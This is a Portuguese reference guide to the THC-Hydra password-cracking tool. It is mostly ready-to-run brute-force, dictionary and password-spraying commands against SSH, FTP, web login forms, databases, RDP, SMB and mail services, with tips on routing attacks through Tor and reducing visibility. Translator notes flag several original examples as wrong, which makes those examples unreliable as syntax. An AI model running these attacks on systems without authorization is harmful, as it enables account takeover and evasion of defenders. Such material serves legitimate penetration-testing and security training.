# 🔓 Hydra — Guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    A ferramenta rápida de quebra de credenciais de rede
```

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Força bruta">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protocolos">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Rede">
</p>

<p align="center">
  <b>🔑 A conhecida ferramenta de quebra de credenciais de rede com execução paralela</b>
</p>

---

## 📋 Índice

- [Introdução](#-introduction)
- [Instalação](#-installation)
- [Sintaxe básica](#-basic-syntax)
- [Protocolos suportados](#-supported-protocols)
- [Ataques a SSH](#-ssh-attacks)
- [Ataques a FTP](#-ftp-attacks)
- [Ataques a formulários HTTP](#-http-form-attacks)
- [Ataques a bases de dados](#-database-attacks)
- [Ataques a ambientes de trabalho remotos](#-remote-desktop-attacks)
- [Outros serviços](#-other-services)
- [Listas de palavras e palavras-passe](#-wordlists--passwords)
- [Opções avançadas](#-advanced-options)
- [Exemplos práticos](#-real-world-examples)
- [Referência rápida](#-quick-reference)
- [Dicas e boas práticas](#-tips--best-practices)
- [Recursos](#-resources)

---

<a id="-introduction"></a>
## 🎯 Introdução

**Hydra** (THC-Hydra) é uma ferramenta rápida e flexível de quebra de palavras-passe através de tentativas de autenticação online. Suporta numerosos protocolos e executa tarefas em paralelo para aumentar a velocidade.

Uma wordlist é uma lista de palavras-passe candidatas. Password spraying testa uma mesma palavra-passe em várias contas; credential stuffing reutiliza pares de credenciais. «Online» significa que cada tentativa é enviada ao serviço de autenticação.

### Principais funcionalidades

| Funcionalidade | Descrição |
|---------|-------------|
| **Mais de 50 protocolos** | SSH, FTP, HTTP, RDP, SMB e outros |
| **Execução paralela** | Várias ligações simultâneas |
| **Flexível** | Cabeçalhos personalizados, cookies e proxy |
| **Retoma** | Guardar e restaurar sessões de ataque |
| **Multiplataforma** | Linux, Windows, macOS |

### Tipos de ataque

| Tipo | Descrição |
|------|-------------|
| **Dicionário** | Testar palavras-passe de uma lista de palavras |
| **Força bruta** | Gerar todas as combinações |
| **Password spraying** | Uma palavra-passe para vários utilizadores |
| **Reutilização de credenciais (credential stuffing)** | Pares de nome de utilizador e palavra-passe |

---

<a id="-installation"></a>
## 📥 Instalação

### Kali Linux (pré-instalado)
```bash
hydra -h
```

### Ubuntu/Debian
```bash
sudo apt install hydra
```

### A partir do código-fonte
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### macOS (Homebrew)
```bash
brew install hydra
```

### Verificar a instalação

> **Precisão do original:** `-V` mostra os pares de utilizador e palavra-passe em cada tentativa; não é uma opção de versão. Consulta a [ajuda oficial do Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).
```bash
hydra -h
hydra -V
```

---

<a id="-basic-syntax"></a>
## ⌨️ Sintaxe básica

### Sintaxe geral
```bash
hydra [options] target service
```

### Opções comuns

| Opção | Descrição |
|--------|-------------|
| `-l` | Um nome de utilizador |
| `-L` | Lista de nomes de utilizador |
| `-p` | Uma palavra-passe |
| `-P` | Lista de palavras-passe |
| `-C` | Ficheiro separado por dois-pontos (user:pass) |
| `-t` | Tarefas paralelas (valor predefinido: 16) |
| `-s` | Número da porta |
| `-o` | Ficheiro de saída |
| `-f` | Parar ao primeiro par válido |
| `-V` | Modo detalhado |
| `-vV` | Saída muito detalhada |
| `-d` | Modo de depuração |

### Início rápido
```bash
# Um utilizador e uma lista de palavras-passe
hydra -l admin -P passwords.txt target ssh

# Lista de utilizadores e uma palavra-passe
hydra -L users.txt -p password123 target ssh

# Ambas as listas
hydra -L users.txt -P passwords.txt target ssh
```

---

<a id="-supported-protocols"></a>
## 📡 Protocolos suportados

### Lista completa de protocolos

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

<a id="-ssh-attacks"></a>
## 🔐 Ataques a SSH

### Ataque básico a SSH
```bash
# Um utilizador
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Vários utilizadores
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Porta específica
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

### SSH com opções
```bash
# Limitar as tentativas (evitar o bloqueio)
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# Parar ao primeiro sucesso
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# Saída detalhada
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

### Autenticação SSH com chave

> **Precisão do original:** o módulo `sshkey` lê ficheiros de chaves privadas. O exemplo com `-x` gera cadeias candidatas e não demonstra a quebra de chaves privadas nem a recuperação da respetiva frase-passe. Ver a [implementação oficial de sshkey](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-sshkey.c).
```bash
# Utilizar uma chave privada (verificar chaves fracas)
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

<a id="-ftp-attacks"></a>
## 📂 Ataques a FTP

### Ataque básico a FTP
```bash
# Força bruta em FTP
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Verificar o acesso anónimo a FTP
hydra -l anonymous -p anonymous ftp://192.168.1.1

# Vários utilizadores
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### FTPS (FTP sobre SSL)
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

<a id="-http-form-attacks"></a>
## 🌐 Ataques a formulários HTTP

### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# Formato:
# "/path:params:failure_string"
```

### HTTP-POST-FORM (o mais comum)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Sintaxe de ataque ao formulário

```
"/page:POST_params:Failure_string"

Em que:
- ^USER^ = Marcador para o nome de utilizador
- ^PASS^ = Marcador para a palavra-passe
- Failure_string = Texto apresentado quando o início de sessão falha
```

### Deteção baseada no sucesso

```bash
# Utilizar S= para indicar o texto de sucesso em vez do texto de falha
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### Com cookies

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

### Autenticação HTTP Basic

```bash
# Autenticação HTTP Basic
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

### Proxy HTTP

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

<a id="-database-attacks"></a>
## 🗄️ Ataques a bases de dados

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# Porta específica
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

### Oracle

```bash
# Ataque ao SID do Oracle
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Listener do Oracle
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

<a id="-remote-desktop-attacks"></a>
## 🖥️ Ataques a ambientes de trabalho remotos

### RDP (Ambiente de Trabalho Remoto do Windows)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# Limitar as tarefas paralelas (RDP é lento)
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

### VNC

```bash
# VNC (apenas palavra-passe)
hydra -P passwords.txt vnc://192.168.1.1

# Versão específica de VNC
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

<a id="-other-services"></a>
## 🔧 Outros serviços

### SMB (partilhas Windows)

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### SMTP

```bash
# Autenticação SMTP
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# Enumeração SMTP
hydra -L users.txt smtp-enum://192.168.1.1
```

### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

<a id="-wordlists--passwords"></a>
## 📚 Listas de palavras e palavras-passe

### Listas de palavras populares

```bash
# Localizações no Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# Palavras-passe do SecLists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

### Geração de palavras-passe (-x)

> **Precisão do original:** não interpretes `!` como um marcador universal para todos os símbolos. Confirma o conjunto efetivo na [ajuda oficial da geração de candidatos](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c); os caracteres especiais dependem da sintaxe suportada pela versão.

```bash
# Gerar palavras-passe: min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 letras minúsculas
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 letras maiúsculas
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 algarismos
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # Combinação de tipos

# Opções do conjunto de caracteres:
# a = minúsculas    A = maiúsculas
# 1 = algarismos    ! = caracteres especiais
```

### Ficheiro separado por dois-pontos (-C)

```bash
# Formato user:password
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

### Personalização do nome de utilizador e da palavra-passe

```bash
# Palavras-passe vazias
hydra -l admin -e n 192.168.1.1 ssh

# Testar o nome de utilizador como palavra-passe
hydra -l admin -e s 192.168.1.1 ssh

# Testar o nome de utilizador invertido como palavra-passe
hydra -l admin -e r 192.168.1.1 ssh

# Todas as verificações especiais
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

<a id="-advanced-options"></a>
## ⚡ Opções avançadas

### Saída e registos

```bash
# Guardar os resultados num ficheiro
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# Saída JSON
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

### Retomar ataques

> **Precisão do original:** `-R` restaura uma sessão interrompida; não é a opção para iniciar uma sessão e guardá-la. O primeiro exemplo é mantido por fidelidade. Ver a [ajuda oficial](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).

```bash
# Guardar a sessão para retoma
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# Retomar um ataque interrompido
hydra -R
```

### Suporte de proxy

```bash
# Proxy HTTP
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# Proxy SOCKS
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

### Ajuste de desempenho

> **Correção das legendas:** `-t` controla o paralelismo por alvo; `-T` controla o total com `-M`, não um timeout. `-w` espera pela resposta; `-W` define o intervalo entre ligações por tarefa. Menos paralelismo não garante ausência de bloqueios. Ver a [ajuda oficial](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).

```bash
# Tarefas paralelas (valor predefinido: 16)
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# Tempo de espera entre tentativas
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# Tempo limite de ligação
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

### Vários alvos

```bash
# A partir de um ficheiro
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

<a id="-real-world-examples"></a>
## 🎬 Exemplos práticos

### Exemplo 1: Força bruta em SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

### Exemplo 2: Formulário de início de sessão web
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

### Exemplo 3: Início de sessão no WordPress
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### Exemplo 4: Vários serviços

> **Sintaxe do original:** a sintaxe geral indica um serviço por invocação. A linha com `ssh ftp mysql` não demonstra três ataques válidos numa única chamada; mantém-se como exemplo do original. Ver a [sintaxe oficial](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).
```bash
# Analisar vários serviços numa máquina
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

### Exemplo 5: Password spraying
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

### Exemplo 6: Com proxy/Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

### Exemplo 7: Autenticação HTTP Basic (painel de administração)
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

### Exemplo 8: Ataque a RDP (com cuidado!)
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Tarefa | Comando |
|------|---------|
| Ataque a SSH | `hydra -l user -P pass.txt ssh://target` |
| Ataque a FTP | `hydra -l user -P pass.txt ftp://target` |
| Formulário HTTP POST | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| Ataque a RDP | `hydra -l user -P pass.txt rdp://target` |
| Guardar a saída | `hydra ... -o results.txt` |
| Retomar o ataque | `hydra -R` |

### Opções comuns

| Opção | Descrição |
|--------|-------------|
| `-l/-L` | Nome de utilizador/lista |
| `-p/-P` | Palavra-passe/lista |
| `-C` | Ficheiro user:pass |
| `-t` | Tarefas paralelas |
| `-s` | Porta |
| `-f` | Parar em caso de sucesso |
| `-V` | Saída detalhada |
| `-o` | Ficheiro de saída |
| `-x` | Gerar palavras-passe |
| `-e nsr` | Testar vazio/igual/invertido |

---

<a id="-tips--best-practices"></a>
## 💡 Dicas e boas práticas

### Dicas de desempenho

1. **Limitar as tarefas paralelas em serviços sensíveis**
   ```bash
   # RDP e SMB — Utilizar poucas tarefas paralelas
   hydra -t 1 ...
   
   # SSH — Paralelismo moderado
   hydra -t 4 ...
   
   # Formulários web — O paralelismo pode ser maior
   hydra -t 16 ...
   ```

2. **Utilizar listas de palavras adaptadas ao alvo**
   ```bash
   # Alternativas mais adaptadas do que rockyou.txt:
   # - As 1000 palavras-passe mais frequentes
   # - Credenciais predefinidas
   # - Palavras específicas da empresa
   ```

3. **Verificar primeiro as políticas de bloqueio**
   ```bash
   # Testar primeiro com uma lista pequena
   hydra -l admin -P small.txt -t 1 target ssh
   ```

### Dicas para reduzir a visibilidade

```bash
# Adicionar intervalos de espera
hydra -l admin -P passwords.txt -w 30 target ssh

# Poucas tarefas paralelas
hydra -l admin -P passwords.txt -t 2 target ssh

# Através de proxy
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

## ⚠️ Aviso legal

> **AVISO:** O Hydra é uma ferramenta de ataque poderosa que deve ser utilizada apenas em **testes autorizados**.
> 
> - ✅ Testar em sistemas que te pertencem
> - ✅ Testar com autorização explícita por escrito
> - ✅ Utilizar em testes de intrusão autorizados
> - ❌ Nunca atacar sem autorização
> - ❌ Aplicar força bruta sem autorização é ilegal
> 
> **As tentativas de acesso não autorizado são ilegais e podem resultar em acusações criminais.**

---

<a id="-resources"></a>
## 📚 Recursos

### Recursos oficiais
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Manual do Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)

### Listas de palavras
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Credenciais predefinidas](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### Guias de referência relacionados
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)

---

<p align="center">
  <b>🔓 Domina a quebra de credenciais de rede!</b><br>
  <i>Obtém sempre autorização primeiro</i>
</p>
